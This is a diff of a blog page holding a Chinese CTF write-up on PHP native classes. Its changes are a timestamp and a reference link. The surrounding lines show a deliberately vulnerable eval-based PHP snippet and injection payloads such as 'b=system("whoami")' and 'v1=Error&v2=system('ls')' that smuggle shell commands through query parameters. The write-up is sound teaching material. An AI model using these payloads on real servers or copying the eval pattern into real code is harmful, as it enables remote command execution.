@@ -14,7 +14,7 @@
 <meta property="og:description" content="web10912345678910111213highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&amp;#x27;v1&amp;#x27;]) &amp;&amp; isset($_GET[&amp;#x27;v2&amp;#x27;]))&amp;#123;    $v1 &#x3D; $_GET[&amp;#x27;v1&amp;#x27;];    $v2 &#x3D; $_GET[&amp;#x27;v">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-01-02T15:29:02.000Z">
-<meta property="article:modified_time" content="2024-01-03T12:34:06.837Z">
+<meta property="article:modified_time" content="2024-01-03T12:39:58.527Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
     
@@ -160,7 +160,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">例1：</span><br><span class="line">&lt;?php</span><br><span class="line">$a=&quot;phpinfo&quot;;</span><br><span class="line">$a();   //phpinfo()会被执行</span><br><span class="line"></span><br><span class="line">例2：</span><br><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">eval(&quot;echo new $a($b);&quot;);</span><br><span class="line"></span><br><span class="line">传入?a=Exception&amp;b=system(&quot;whoami&quot;)</span><br><span class="line">因为echo new $a($b);会输出system(“whoami”)，然后会被eval放入代码中去执行，即可造成RCE</span><br></pre></td></tr></table></figure>
 
 <p>2.php原生类——主要包括报错类、遍历目录类、读取文件类、反射类。</p>
-<p>详细介绍见大佬博客：</p>
+<p>详细介绍见大佬博客：<a target="_blank" rel="noopener" href="https://ch1e.gitee.io/2021/11/12/yuanshenglei/">https://ch1e.gitee.io/2021/11/12/yuanshenglei/</a> </p>
 <p>这道题主要用到了报错类：Error、Exception都可，它们都带有__toString()方法，即输出一个该类的对象时会输出构造函数的参数。</p>
 <p>payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=Error&amp;v2=system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>
